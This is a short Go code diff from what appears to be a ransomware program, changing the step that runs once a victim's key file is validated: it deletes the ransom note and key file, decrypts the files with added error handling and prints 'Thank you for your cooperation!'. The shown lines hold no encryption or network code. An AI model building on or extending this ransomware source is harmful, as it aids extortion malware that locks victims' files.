@@ -61,12 +61,15 @@ func main() {
 			fmt.Println("Checking key file...")
 
 			if ok := rw.CheckIfValidMemSafeKey(); ok {
-				crypt.DecryptRoot(rw.RootDir, rw.MemguardKey)
-				fmt.Println("Thank you for your cooperation!")
-
 				// remove the generated files
 				rw.RemoveRansomFile()
 				rw.RemoveKeyFile()
+
+				if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
+					log.Fatalf("error decrypting all files: %s", err)
+				}
+
+				fmt.Println("Thank you for your cooperation!")
 
 				// Stop the whole program
 				os.Exit(0)
